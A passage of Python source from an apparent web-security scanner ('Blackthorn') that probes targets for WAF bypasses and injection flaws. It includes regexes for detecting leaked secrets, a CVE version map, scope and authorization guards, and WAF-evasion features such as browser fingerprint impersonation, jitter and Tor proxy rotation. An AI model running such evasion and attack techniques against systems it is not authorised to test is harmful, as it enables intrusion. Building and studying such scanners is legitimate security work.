    'Slack Token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*',
    'JWT Token': r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*',
    'Private Key': r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
    'Firebase Config': r'apiKey["\']?\s*[:=]\s*["\']AIza[0-9A-Za-z\-_]{35}',
    'Generic API Key': r'(?:api[_-]?key|apikey|secret|token)["\']?\s*[:=]\s*["\'][0-9a-zA-Z\-_]{16,}["\']',
    'Google OAuth Client': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
}

# Minimal version -> known-CVE map for tech-stack fingerprinting. Conservative:
# only well-known, high-signal CVEs keyed by lowercase product + a version regex.
CVE_VERSION_MAP = [
    # (product_substring, version_regex, cve, severity, note)
    ('openssl', r'1\.0\.1[ -].*', 'CVE-2014-0160', 'CRITICAL', 'Heartbleed'),
    ('apache', r'2\.4\.49', 'CVE-2021-41773', 'CRITICAL', 'Path traversal/RCE'),
    ('apache', r'2\.4\.50', 'CVE-2021-42013', 'CRITICAL', 'Path traversal/RCE'),
    ('nginx', r'1\.(?:[0-9]|1[0-9]|20)\.', 'CVE-2021-23017', 'HIGH', 'DNS resolver off-by-one'),
    ('php', r'(?:7\.|8\.0\.|8\.1\.[0-2]\b)', 'CVE-2024-4577', 'CRITICAL', 'CGI argument injection (Windows)'),
    ('iis', r'7\.5', 'CVE-2015-1635', 'HIGH', 'HTTP.sys RCE (MS15-034)'),
    ('tomcat', r'9\.0\.[0-9]\b', 'CVE-2020-1938', 'HIGH', 'Ghostcat AJP file read'),
    ('jenkins', r'2\.4(?:[0-3][0-9]|41)', 'CVE-2024-23897', 'CRITICAL', 'Arbitrary file read'),
    ('exim', r'4\.(?:[0-8][0-9])', 'CVE-2019-10149', 'CRITICAL', 'RCE'),
    ('log4j', r'2\.(?:[0-9]|1[0-6])\.', 'CVE-2021-44228', 'CRITICAL', 'Log4Shell'),
]

# Patterns for dynamic tokens that change on every response. These are stripped
# before comparing a candidate body to the baseline so that CSRF tokens, nonces,
# timestamps, request ids, etc. do not produce false "different content" bypasses.
DYNAMIC_TOKEN_PATTERNS = re.compile(
    r'(?:'
    r'csrf[_-]?token|csrfmiddlewaretoken|authenticity_token|__requestverificationtoken|'
    r'__viewstate|__eventvalidation|__viewstategenerator|'
    r'nonce|request[_-]?id|x-request-id|trace[_-]?id|correlation[_-]?id|'
    r'sessionid|jsessionid|phpsessid|csrf|xsrf'
    r')["\'=:\s]+[^"\'<>&\s]{6,}',
    re.IGNORECASE,
)
# Generic high-entropy / volatile substrings (uuids, hex blobs, iso timestamps, epoch).
UUID_PATTERN = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.IGNORECASE)
HEXBLOB_PATTERN = re.compile(r'\b[0-9a-f]{16,}\b', re.IGNORECASE)
ISO_TS_PATTERN = re.compile(r'\d{4}-\d{2}-\d{2}[t ]\d{2}:\d{2}:\d{2}', re.IGNORECASE)
EPOCH_PATTERN = re.compile(r'\b1[5-9]\d{8,11}\b')  # 10-13 digit unix timestamps


def _load_wordlist(name: str, fallback: Optional[List[str]] = None) -> List[str]:
    """Load a wordlist by filename, searching script/installed/frozen locations.

    Looks in: <repo>/wordlists, <package>/wordlists, CWD/wordlists, and the
    PyInstaller bundle dir. Returns ``fallback`` (or a tiny default) if not found.
    """
    import os as _os
    candidates = []
    here = _os.path.dirname(_os.path.abspath(__file__))
    candidates.append(_os.path.join(here, '..', 'wordlists', name))   # repo root
    candidates.append(_os.path.join(here, 'wordlists', name))         # packaged
    candidates.append(_os.path.join(_os.getcwd(), 'wordlists', name))  # cwd
    bundle = getattr(sys, '_MEIPASS', None)
    if bundle:
        candidates.append(_os.path.join(bundle, 'wordlists', name))
    for path in candidates:
        try:
            if _os.path.isfile(path):
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    words = [ln.strip() for ln in f if ln.strip() and not ln.startswith('#')]
                if words:
                    return words
        except Exception:
            continue
    return list(fallback or [])


def _normalize_body(text: str, limit: int = 20000) -> str:
    """Strip volatile tokens from a response body so baselines compare stably.

    Removes CSRF/nonce/session tokens, UUIDs, long hex blobs, ISO timestamps and
    epoch values. Used by the baseline jitter logic and similarity scoring.
    """
    if not text:
        return ""
    sample = text[:limit]
    sample = DYNAMIC_TOKEN_PATTERNS.sub('<TOKEN>', sample)
    sample = UUID_PATTERN.sub('<UUID>', sample)
    sample = ISO_TS_PATTERN.sub('<TS>', sample)
    sample = EPOCH_PATTERN.sub('<EPOCH>', sample)
    sample = HEXBLOB_PATTERN.sub('<HEX>', sample)
    return sample


class _AdaptiveLimiter:
    """Adaptive concurrency limiter.

    Wraps a semaphore whose effective cap shrinks when the target pushes back
    (429/503) and slowly recovers after sustained success. Combined with a single
    shared thread pool this makes the configured thread count a real ceiling on
    in-flight requests instead of an exploding nested-pool multiplier.
    """

    def __init__(self, max_concurrency: int):
        self.max_concurrency = max(1, int(max_concurrency))
        self._sem = threading.Semaphore(self.max_concurrency)
        self._lock = threading.Lock()
        self._cap = self.max_concurrency   # current allowed concurrency
        self._reserved = 0                 # permits withheld to shrink the cap
        self._success = 0

    def acquire(self):
        self._sem.acquire()

    def release(self):
        self._sem.release()

    def penalize(self):
        """Shrink concurrency by withholding a permit (floor of 1)."""
        with self._lock:
            if self._cap > 1 and self._sem.acquire(blocking=False):
                self._cap -= 1
                self._reserved += 1
            self._success = 0

    def reward(self):
        """Return a withheld permit after a streak of clean responses."""
        with self._lock:
            self._success += 1
            if self._success >= 25 and self._reserved > 0:
                self._sem.release()
                self._cap += 1
                self._reserved -= 1
                self._success = 0

    @property
    def current_cap(self) -> int:
        return self._cap


class CloudFrontBypasser(ExtraTechniques):
    """Blackthorn web-security scanner with matched controls and proof oracles."""
    
    # Class-level session pool for connection reuse
    _session_pool: Dict[str, requests.Session] = {}
    _session_lock = threading.Lock()
    
    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5, proxy_config: dict = None, enable_http_logging: bool = False, enable_ssl_analysis: bool = False, enable_crawl: bool = True, enable_schema: bool = True, custom_payloads: dict = None, plugins: list = None, evasion_profile: dict = None, auth: dict = None, oob=None, impersonate: Optional[str] = None, scope: dict = None, safe_mode: bool = False, jitter: float = 0.0, proxy_pool: list = None, seed_targets: list = None, intrusive: bool = False, authorization_patterns: list = None):
        """
        Initialize the Blackthorn scanner.

        Args:
            target: Target URL to scan
            threads: Number of concurrent threads
            delay: Delay between requests (seconds)
            timeout: Request timeout (seconds)
            proxy_config: Optional proxy configuration dict with 'type', 'host', 'port' keys
            enable_http_logging: Enable full HTTP request/response logging for forensic analysis
            enable_ssl_analysis: Enable SSL/TLS certificate and cipher analysis
            enable_crawl: Crawl the target to discover endpoints/params for injection fuzzing
            enable_schema: Ingest OpenAPI/Swagger/GraphQL schemas to discover endpoints/params
            custom_payloads: Optional dict {category: [payloads]} merged into injection tests
            plugins: Optional list of loaded BypassPlugin instances run during the scan
            evasion_profile: Optional dict of evasion settings (headers, user_agents, encoding)

        Raises:
            InvalidTargetError: If target URL is invalid
            InvalidThreadCountError: If threads is not positive
            InvalidDelayError: If delay is negative
            InvalidTimeoutError: If timeout is not positive
        """
        # Validate inputs
        self._validate_inputs(target, threads, delay, timeout)
        
        self.target = target.rstrip('/')
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.results = []
        self._results_lock = threading.Lock()
        self.proxy_config = proxy_config
        
        # HTTP Logging for forensic analysis
        self.enable_http_logging = enable_http_logging
        self._http_log: List[Dict[str, Any]] = []
        self._http_log_lock = threading.Lock()
        
        # SSL/TLS Analysis
        self.enable_ssl_analysis = enable_ssl_analysis
        self._ssl_info: Dict[str, Any] = {}
        
        # Rate limiting auto-adjustment
        self._rate_limit_detected = False
        self._rate_limit_adjustments = 0
        self._original_delay = delay
        self._max_delay = max(delay * 10, 2.0)  # Max 10x original delay (floor 2s)

        # Single shared thread pool + adaptive concurrency limiter.
        # Techniques run sequentially and fan their requests out across this one
        # bounded pool, so `threads` is a real ceiling on concurrent requests
        # rather than an exploding nested-pool multiplier.
        self._executor: Optional[ThreadPoolExecutor] = None
        self._limiter = _AdaptiveLimiter(threads)

        # Baseline tracking
        self._baseline_size = None
        self._baseline_hash = None
        self._baseline_status = None
        self._baseline_headers = {}
        self._baseline_body_sample = ""
        self._baseline_norm = ""        # normalized baseline body for similarity
        self._baseline_jitter = 0       # observed size jitter band (bytes)
        self._baseline_dynamic = False  # True if the page changes between loads

        # Discovered endpoints/params (populated by the crawler / schema ingestion).
        # Each entry: {'path': str, 'params': {name: value}, 'method': str}
        self.crawl_targets: List[Dict[str, Any]] = []
        self.enable_crawl = enable_crawl
        self.enable_schema = enable_schema

        # Optional extensibility wired into the engine (custom payloads, plugins,
        # evasion profiles). These were previously stored in the DB/GUI but never
        # consumed by the scanner.
        self.custom_payloads: Dict[str, List[str]] = custom_payloads or {}
        self._loaded_plugins = plugins or []
        self.evasion_profile = evasion_profile or {}
        # Authenticated scanning: cookies / headers / bearer / basic / login flow.
        self.auth = auth or {}

        # Re-confirmation: replay each flagged bypass a few more times (cache off)
        # and demote ones that don't reproduce. Crushes false positives from
        # transient jitter. Toggleable by the CLI/GUI.
        self.reconfirm = True
        self.reconfirm_samples = 2

        # Out-of-band confirmation engine (opt-in). When set, blind-vuln payloads
        # embed callbacks to this provider and confirmed interactions become
        # CRITICAL findings with proof. None -> OOB phase is a no-op.
        self.oob = oob
        self.oob_wait = 8               # min seconds to wait for callbacks
        self._oob_fired: Dict[str, Tuple[str, str]] = {}
        self._oob_spray_time: float = 0.0
        self._oob_seen: Set[str] = set()

        # TLS/HTTP2 fingerprint impersonation (JA3/JA4 + H2 frame order) via
        # curl_cffi. Lets probes mimic a real browser to slip past JS/bot WAFs
        # (DataDome, PerimeterX, Kasada...). None -> plain requests stack.
        # Accepts a browser target ("chrome", "chrome124", "safari17_0", ...).
        self.impersonate = impersonate
        self._impersonating = False

        # Engine controls (v1.6):
        #  scope      : {'include':[regex], 'exclude':[regex]} for discovery/recon
        #  safe_mode  : skip noisy/DoS-flavored techniques and state-changing writes
        #  jitter     : add up to N random seconds per request (rate-WAF evasion)
        #  proxy_pool : rotate requests across a list of proxy URLs (incl. Tor)
        import re as _re
        self.scope = scope or {}
        self._scope_inc = [_re.compile(p, _re.I) for p in (self.scope.get('include') or [])]
        self._scope_exc = [_re.compile(p, _re.I) for p in (self.scope.get('exclude') or [])]
        # Scope narrows work; only the engagement allowlist grants active access
        # to a related host or another origin.
        self.authorization_patterns = list(authorization_patterns or [])
        self.safe_mode = safe_mode
        # Stateful workflow guesses (uploads, transfers, emails, cache poison)
        # require a separate, explicit opt-in even outside safe mode.
        self.intrusive = bool(intrusive)
        self.jitter = max(0.0, float(jitter or 0.0))
        self.proxy_pool = list(proxy_pool) if proxy_pool else []
        # Endpoints seeded from imported traffic (HAR/Postman/Burp); merged into
        # discovery so injection tests fuzz those real requests too.
        self.seed_targets = list(seed_targets) if seed_targets else []

        # WAF feedback loop: an optional DB handle used to (a) reorder techniques
        # so historically-effective ones run first against the detected WAF and
        # (b) record this scan's outcomes for next time. None -> learning off.
        self.feedback_db = None
        self._detected_waf_type: Optional[str] = None

        # Resumable scans: when True, scan() loads a per-target checkpoint, skips
        # already-completed techniques, and saves progress after each one.
        self.resume = False
        self._completed_techniques: Set[str] = set()
        # Auto re-login throttle (re-auth at most once per window on expiry).
        self._last_reauth = 0.0

        # Response cache to avoid duplicate requests
        self._response_cache: Dict[str, Dict] = {}
        # Matched benign controls are cached separately from probe verdicts.
        # This keeps a normal endpoint response from being compared to GET / and
        # avoids re-fetching the same clean request for every payload variant.
        self._control_cache: Dict[str, Dict[str, Any]] = {}
        self._cache_lock = threading.Lock()
        
        # Parse target
        try:
            parsed = urlparse(self.target)
            self.domain = parsed.netloc
            self.scheme = parsed.scheme
            
            if not self.domain:
                raise InvalidTargetError(
                    "Invalid target URL: missing domain",
                    details={'target': target}
                )
        except Exception as e:
            raise InvalidTargetError(
                f"Failed to parse target URL: {str(e)}",
                details={'target': target}
            )
        
        # Initialize optimized session with connection pooling
        self._session = self._get_optimized_session()
        self._apply_evasion_profile()
        self._apply_auth()
        # Passive third-party lookups must never inherit target cookies, bearer
        # tokens, Basic auth, or custom API-key headers from the scan session.
        self._recon_session = requests.Session()
        self._recon_session.headers.update({
            'User-Agent': 'Blackthorn passive security research client',
            'Accept': 'application/json,text/plain,*/*',
        })
        if self.proxy_config:
            proxy_type = self.proxy_config.get('type', 'http')
            proxy_host = self.proxy_config.get('host', '127.0.0.1')
            proxy_port = self.proxy_config.get('port', 8080)
            scheme = 'socks5h' if proxy_type in ('socks5', 'socks5h') else 'http'
            proxy_url = f"{scheme}://{proxy_host}:{proxy_port}"
            self._recon_session.proxies = {'http': proxy_url, 'https': proxy_url}

        logger.info(f"Initialized scanner for {self.target}")

    # Techniques skipped in --safe-mode (DoS-flavored or noisy/state-changing).
    SAFE_MODE_SKIP = {
        '_test_race_condition', '_test_single_packet_race', '_test_buffer_limits',
        '_test_integer_overflow', '_test_range_header_attacks', '_test_http_desync',
        '_test_smuggling_cl0', '_test_multipart_bypass', '_test_graphql_deep_testing',
        '_test_websocket_fuzzing',
        # State-changing or potentially destructive guesses.  These require an
        # explicitly active scan rather than the safe-mode transport contract.
        '_test_mass_assignment', '_test_business_logic_flaws',
        '_test_email_header_injection', '_test_file_upload_bypass',
        '_test_pdf_injection', '_test_content_sniffing',
        '_test_verb_tampering_extended', '_test_llm_prompt_injection',
        '_test_auth_logic', '_test_prototype_pollution',
        '_test_deserialization', '_test_json_injection', '_test_xslt_injection',
        '_test_xxe_detection', '_test_ssi_injection', '_test_log4shell_patterns',
        '_test_time_based_detection', '_test_ssrf_protocol_smuggling',
        '_test_cloud_metadata_v2', '_test_oob_interactions',
        '_test_cache_poisoning', '_test_web_cache_deception',
        '_test_path_traversal_bypass',
    }

    INTRUSIVE_WORKFLOW_SKIP = {
        '_test_race_condition', '_test_single_packet_race',
        '_test_mass_assignment', '_test_business_logic_flaws',
        '_test_email_header_injection', '_test_file_upload_bypass',
        '_test_pdf_injection', '_test_host_header_attacks',
        '_test_cache_poisoning', '_test_cache_poisoning_deep',
        '_test_web_cache_deception', '_test_graphql_deep_testing',
        '_test_ssrf_protocol_smuggling', '_test_cloud_metadata_v2',
        '_test_cloud_metadata_enumeration', '_test_ssrf_bypass',
        '_test_dns_rebinding', '_test_auth_logic',
        '_test_content_sniffing', '_test_verb_tampering_extended',
        '_test_llm_prompt_injection',
    }

    # These checks cannot be implemented faithfully through Requests because it
    # normalizes ambiguous framing. Disable them instead of reporting fabricated
    # smuggling/desynchronization evidence.
    DISABLED_TRANSPORT_TECHNIQUES = {
        '_test_transfer_encoding_smuggling', '_test_chunked_transfer',
        '_test_request_smuggling_v2', '_test_http2_specific_attacks',
        '_test_http_desync', '_test_smuggling_cl0', '_test_single_packet_race',
    }

    # Kept visible in the catalog, but disabled because the current probe cannot
    # produce the state transition needed to prove the vulnerability.
    DISABLED_ACCURACY_TECHNIQUES = {
        '_test_dns_rebinding',
    }

    def _in_scope(self, url: str) -> bool:
        """Scope guard for discovered/recon URLs. Exclude wins; if an include list
        exists, a URL must match at least one include pattern."""
        if not url:
            return True
        if any(p.search(url) for p in self._scope_exc):
            return False
        if self._scope_inc and not any(p.search(url) for p in self._scope_inc):
            return False
        return True

    def _scoped_safe_request(self, url: str, method: str = 'GET', **kwargs):
        """Unified request boundary for legacy/direct scanners.

        Target-origin requests use the authenticated scan session. Other origins
        use the sterile recon session, so cookies/API keys never leave the target.
        Redirects are followed only while they remain on the same allowed origin.
        """
        if not url:
            return None
        url = str(url)
        passive_lookup = bool(kwargs.pop('passive_lookup', False))
        is_target = self._same_target_origin(url)
        if is_target and not self._in_scope(url):
            logger.debug(f"Request blocked by scope: {url}")
            return None
        if not is_target and not passive_lookup:
            try:
                from .authorization import is_authorized
                authorized = bool(
                    self.authorization_patterns
                    and is_authorized(url, self.authorization_patterns)
                )
            except Exception:
                authorized = False
            if not authorized:
                logger.debug(f"Related/external active request blocked by authorization: {url}")
                return None
            if not self._in_scope(url):
                logger.debug(f"Related/external request blocked by scope: {url}")
                return None

        session = self._session if is_target else getattr(self, '_recon_session', None)
        if session is None:
            session = requests.Session()
        wanted_redirects = bool(kwargs.pop('allow_redirects', False))
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('verify', False)
        current = url
        response = None
        try:
            for _ in range(6):
                response = session.request(
                    method=method, url=current, allow_redirects=False, **kwargs
                )
                if not wanted_redirects or response is None or response.status_code not in (
                    301, 302, 303, 307, 308
                ):
                    return response
                location = response.headers.get('Location')
                if not location:
                    return response
                following = urljoin(current, location)
                if not self._same_target_origin(following) and is_target:
                    logger.debug(f"Stopped credentialed redirect at origin boundary: {following}")
                    return response
                if not is_target and not self._same_origin(current, following):
                    logger.debug(f"Stopped external redirect at origin boundary: {following}")
                    return response
                if not self._in_scope(following):
                    logger.debug(f"Stopped redirect at scope boundary: {following}")
                    return response
                current = following
                if response.status_code == 303:
                    method = 'GET'
                    kwargs.pop('data', None)
                    kwargs.pop('json', None)
            return response
        except Exception as exc:
            logger.debug(f"Scoped request failed for {method} {url}: {exc}")
            return None

    @staticmethod
    def _same_origin(left: str, right: str) -> bool:
        """Compare scheme, hostname, and effective port for absolute URLs."""
        try:
            def origin(value):
                parsed = urlparse(value)
                scheme = parsed.scheme.lower()
                port = parsed.port or (443 if scheme == 'https' else 80)
                return scheme, (parsed.hostname or '').lower(), port
            return origin(left) == origin(right)
        except Exception:
            return False

    def _apply_auth(self) -> None:
        """Apply authenticated-scanning settings to the session so EVERY request
        runs as the authenticated user.

        Accepted ``auth`` keys (all optional):
          * 'cookies'      : dict, or a raw 'k=v; k2=v2' Cookie string
          * 'headers'      : dict of extra headers (e.g. an API key header)
          * 'bearer'       : a bearer token -> Authorization: Bearer <token>
          * 'basic'        : (user, pass) tuple -> HTTP Basic auth
          * 'login'        : {'url','method','data'/'json','success'} to log in and
                             capture the session cookies before scanning
        """
        a = self.auth or {}
        if not a:
            return
        try:
            cookies = a.get('cookies')
            if isinstance(cookies, str):
                for part in cookies.split(';'):
                    if '=' in part:
                        k, v = part.split('=', 1)
                        self._session.cookies.set(k.strip(), v.strip())
            elif isinstance(cookies, dict):
                for k, v in cookies.items():
                    self._session.cookies.set(k, v)

            if isinstance(a.get('headers'), dict):
                self._session.headers.update(a['headers'])
            if a.get('bearer'):
                self._session.headers['Authorization'] = f"Bearer {a['bearer']}"
            if a.get('basic') and len(a['basic']) == 2:
                self._session.auth = tuple(a['basic'])

            login = a.get('login')
            if isinstance(login, dict) and login.get('url'):
                self._perform_login(login)
            if a:
                logger.info("Authenticated scanning: session credentials applied")
                print("[*] Authenticated scanning enabled")
        except Exception as e:
            logger.debug(f"Auth apply error: {e}")

    def _perform_login(self, login: dict) -> bool:
        """Execute a login request and keep the resulting session cookies."""
        try:
            method = (login.get('method') or 'POST').upper()
            url = urljoin(f"{self.target}/", str(login['url']))
            if not self._same_target_origin(url) or not self._in_scope(url):
                print("[!] Login URL must remain inside the authorized target origin and scope")
                return False
            kwargs = {'timeout': self.timeout, 'verify': False, 'allow_redirects': True}
            if login.get('json') is not None:
                kwargs['json'] = login['json']
            elif login.get('data') is not None:
                kwargs['data'] = login['data']
            resp = self._scoped_safe_request(url, method=method, **kwargs)
            success = login.get('success')
            ok = True
            if success and resp is not None:
                ok = success in resp.text
            if resp is not None and resp.status_code < 400 and ok:
                print(f"[+] Login succeeded ({resp.status_code}); {len(self._session.cookies)} cookie(s) captured")
                return True
            print(f"[!] Login may have failed (status {getattr(resp,'status_code','?')})")
        except Exception as e:
            logger.debug(f"Login error: {e}")
            print(f"[!] Login error: {e}")
        return False

    def _apply_evasion_profile(self) -> None:
        """Apply an evasion profile's header/UA tweaks to the live session.

        Supported keys (all optional):
          * 'user_agent' / 'user_agents' : fixed UA or a rotation pool
          * 'headers'                    : dict of extra headers to send
        Technique selection from a profile's 'techniques' list is honored in scan().
        """
        profile = self.evasion_profile or {}
        try:
            uas = profile.get('user_agents') or ([profile['user_agent']] if profile.get('user_agent') else [])
            if uas:
                self._evasion_user_agents = list(uas)
                self._session.headers['User-Agent'] = uas[0]
            extra = profile.get('headers')
            if isinstance(extra, dict):
                self._session.headers.update(extra)
            if profile.get('name'):
                logger.info(f"Applied evasion profile: {profile.get('name')}")
        except Exception as e:
            logger.debug(f"Evasion profile apply error: {e}")
    
    @staticmethod
    def _curl_cffi_browsers() -> Set[str]:
        """Supported curl_cffi impersonation targets (empty set if undiscoverable
        — in which case we don't pre-filter and let curl_cffi decide)."""
        import typing
        try:
            from curl_cffi.requests.impersonate import BrowserTypeLiteral
            return set(typing.get_args(BrowserTypeLiteral))
        except Exception:
            pass
        try:
            from curl_cffi.requests import BrowserType
            return {b.value for b in BrowserType}
        except Exception:
            return set()

    def _build_impersonation_session(self):
        """Build a curl_cffi session that mimics a real browser's TLS (JA3/JA4)
        and HTTP/2 fingerprint. Returns None if curl_cffi is unavailable or the
        requested target is invalid, so the caller can fall back to ``requests``.
        """
        try:
            from curl_cffi import requests as cffi
        except Exception:
            logger.warning("curl_cffi not installed; --impersonate ignored (using requests)")
            return None

        # Resolve the impersonation target; a bare flag means "a recent Chrome".
        target = self.impersonate
        if not isinstance(target, str) or target.lower() in ('1', 'true', 'yes', 'auto', 'on'):
            target = 'chrome'

        # curl_cffi validates the target lazily (at request time, not session
        # construction), so an unsupported value would only blow up mid-scan.
        # Validate against the supported set up front and fall back to 'chrome'.
        supported = self._curl_cffi_browsers()
        if supported and target not in supported and target != 'chrome':
            logger.warning(f"Impersonation target '{target}' unsupported; falling back to 'chrome'")
            print(f"[!] Impersonation target '{target}' not supported; using 'chrome'")
            target = 'chrome'

        try:
            session = cffi.Session(impersonate=target)
        except Exception as e:
            logger.warning(f"curl_cffi impersonation unavailable ({e}); using requests")
            return None

        if self.proxy_config:
            proxy_type = self.proxy_config.get('type', 'http')
            proxy_host = self.proxy_config.get('host', '127.0.0.1')
            proxy_port = self.proxy_config.get('port', 8080)
            scheme = 'socks5h' if proxy_type in ('socks5', 'socks5h') else 'http'
            proxy_url = f"{scheme}://{proxy_host}:{proxy_port}"
            session.proxies = {'http': proxy_url, 'https': proxy_url}
            logger.info(f"Using proxy: {proxy_url}")

        # Do NOT override User-Agent / Accept headers here: curl_cffi sets a
        # browser-consistent header set as part of the impersonation, and
        # rewriting them would defeat the fingerprint match.
        self._impersonating = True
        logger.info(f"TLS/HTTP2 impersonation active (curl_cffi: {target})")
        print(f"[*] Fingerprint impersonation: {target} (JA3/JA4 + HTTP/2)")
        return session

    def _get_optimized_session(self) -> requests.Session:
        """Create an optimized session with connection pooling and retry logic"""
        if self.impersonate:
            impersonated = self._build_impersonation_session()
            if impersonated is not None:
                return impersonated

        session = requests.Session()
        
        # Retry transport failures, never HTTP status codes. A 500/502/503 body
        # can be the detector-specific evidence we need, and automatic status
        # retries previously discarded it behind MaxRetryError (while also
        # tripling intrusive requests).
        retry_strategy = Retry(
            total=2,
            connect=2,
            read=2,
            status=0,
            backoff_factor=0.3,
            status_forcelist=[],
            raise_on_status=False,
        )
        
        # Mount adapters with connection pooling
        adapter = HTTPAdapter(
            pool_connections=self.threads,
            pool_maxsize=self.threads * 2,
            max_retries=retry_strategy
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Configure proxy if provided
        if self.proxy_config:
            proxy_type = self.proxy_config.get('type', 'http')
            proxy_host = self.proxy_config.get('host', '127.0.0.1')
            proxy_port = self.proxy_config.get('port', 8080)
            
            if proxy_type in ('socks5', 'socks5h'):
                proxy_url = f"socks5h://{proxy_host}:{proxy_port}"
            else:
                proxy_url = f"http://{proxy_host}:{proxy_port}"
            
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            logger.info(f"Using proxy: {proxy_url}")
        
        # Default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        # Disable SSL warnings for speed
        session.verify = False
        
        return session
    
    def _validate_inputs(self, target: str, threads: int, delay: float, timeout: int) -> None:
        """Validate all input parameters"""
        # Validate URL
        is_valid, error_msg = validate_url(target)
        if not is_valid:
            raise InvalidTargetError(error_msg, details={'target': target})
        
        # Validate scheme
        parsed = urlparse(target)
        if parsed.scheme not in ['http', 'https']:
            raise InvalidSchemeError(
                f"Invalid scheme '{parsed.scheme}'. Must be http or https",
                details={'target': target, 'scheme': parsed.scheme}
            )
        
        # Validate threads
        if not isinstance(threads, int) or threads <= 0:
            raise InvalidThreadCountError(
                f"Thread count must be positive integer, got: {threads}",
                details={'threads': threads}
            )
        
        # Validate delay
        if not isinstance(delay, (int, float)) or delay < 0:
            raise InvalidDelayError(
                f"Delay must be non-negative number, got: {delay}",
                details={'delay': delay}
            )
        
        # Validate timeout
        if not isinstance(timeout, (int, float)) or timeout <= 0:
            raise InvalidTimeoutError(
                f"Timeout must be positive number, got: {timeout}",
                details={'timeout': timeout}
            )
    
    def scan(self, selected_categories: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """
        Run bypass techniques based on selected categories
        
        Args:
            selected_categories: List of category keys to run, or None for all
        
        Returns:
            List of successful bypass results
        
        Raises:
            BaselineFailedError: If baseline cannot be established
            TargetUnreachableError: If target is completely unreachable
            ScanInterruptedError: If scan is interrupted
        """
        logger.info(f"Starting scan of {self.target}")
        print(f"[*] Scanning {self.target}")

        # Start the clock for the optional --max-time budget.
        self._scan_start = time.monotonic()

        # Establish baseline first
        print("[*] Establishing baseline...")
        try:
            baseline = self._get_baseline()
            if baseline is None:
                raise BaselineFailedError(
                    "Failed to establish baseline - target may be down",
                    details={'target': self.target}
                )
            
            self._baseline_size = len(baseline.content)
            self._baseline_hash = hashlib.md5(baseline.content).hexdigest()
            self._baseline_status = baseline.status_code
            self._baseline_headers = dict(baseline.headers)
            self._baseline_body_sample = baseline.text[:5000] if baseline.content else ""
            self._baseline_norm = _normalize_body(baseline.text if baseline.content else "")

            # Multi-sample: fetch the baseline a couple more times to learn the
            # natural jitter of the page. Pages with CSRF tokens / timestamps change
            # size every load; without this, every probe looks like a "bypass".
            sizes = [self._baseline_size]
            norms = [self._baseline_norm]
            for _ in range(2):
                try:
                    extra = self._get_baseline()
                    if extra is not None:
                        sizes.append(len(extra.content))
                        norms.append(_normalize_body(extra.text if extra.content else ""))
                except Exception:
                    break

            self._baseline_jitter = (max(sizes) - min(sizes)) if len(sizes) > 1 else 0
            # The page is "dynamic" if raw size moves but normalized content is stable
            # (i.e. only tokens/timestamps change), or if size jitter is non-trivial.
            norm_stable = len(set(norms)) == 1
            self._baseline_dynamic = (self._baseline_jitter > 0) or (not norm_stable)
            # Use the most common normalized body as the reference.
            self._baseline_norm = max(set(norms), key=norms.count) if norms else ""

            logger.info(
                f"Baseline established: {self._baseline_status} | "
                f"{self._baseline_size} bytes | jitter={self._baseline_jitter}b | "
                f"dynamic={self._baseline_dynamic} | {self._baseline_hash[:8]}"
            )
            print(f"[+] Baseline: {self._baseline_status} | Size: {self._baseline_size} bytes "
                  f"| jitter: ±{self._baseline_jitter}b | dynamic: {self._baseline_dynamic}")
        
        except BaselineFailedError:
            raise
        except TargetUnreachableError:
            raise
        except Exception as e:
            logger.error(f"Unexpected error during baseline: {e}")
            raise BaselineFailedError(
                f"Baseline failed: {str(e)}",
                details={'target': self.target, 'error': str(e)}
            )
        
        print(f"[*] Testing bypass techniques...\n")
        
        # Run WAF Detection first
        print("[*] Phase 1: WAF Detection & Fingerprinting...")
        waf_results = self._detect_waf()
        if waf_results:
            self.results.extend(waf_results)
            # Capture the highest-confidence WAF vendor for the feedback loop.
            for r in waf_results:
                if r.get('category') == 'WAF_DETECTION' and r.get('details', {}).get('waf'):
                    self._detected_waf_type = r['details']['waf']
                    break
        
        cdn_results = self._detect_cdn()
        if cdn_results:
            self.results.extend(cdn_results)
        
        # Detect target operating system
        print("\n[*] Phase 2: OS Detection...")
        detected_os, os_confidence, os_results = self._detect_target_os()
        if os_results:
            self.results.extend(os_results)

        # Discover real endpoints + params so injection tests hit live inputs.
        if self.enable_crawl or self.enable_schema or self.seed_targets:
            print("\n[*] Phase 2.5: Endpoint & Parameter Discovery...")
            try:
                self._run_discovery()
            except Exception as e:
                logger.debug(f"Discovery phase error: {e}")

        # OOB: spray blind-vuln callbacks early so the rest of the scan serves as
        # the wait window; interactions are collected after the techniques run.
        if self.oob and not self.safe_mode:
            try:
                self._oob_spray()
            except Exception as e:
                logger.debug(f"OOB spray error: {e}")
        elif self.oob and self.safe_mode:
            print("[*] Safe mode: skipped active out-of-band callback probes")

        print("\n[*] Phase 3: Testing bypass techniques...")
        
        # Build technique list based on selected categories
        techniques = []
        
        # If no categories selected, run all
        if selected_categories is None or len(selected_categories) == 0:
            selected_categories = list(SCAN_CATEGORIES.keys())
        
        # Map of technique name to method
        technique_map = {
            '_test_host_header_injection': self._test_host_header_injection,
            '_test_x_forwarded_for': self._test_x_forwarded_for,
            '_test_x_forwarded_host': self._test_x_forwarded_host,
            '_test_x_original_url': self._test_x_original_url,
            '_test_header_injection': self._test_header_injection,
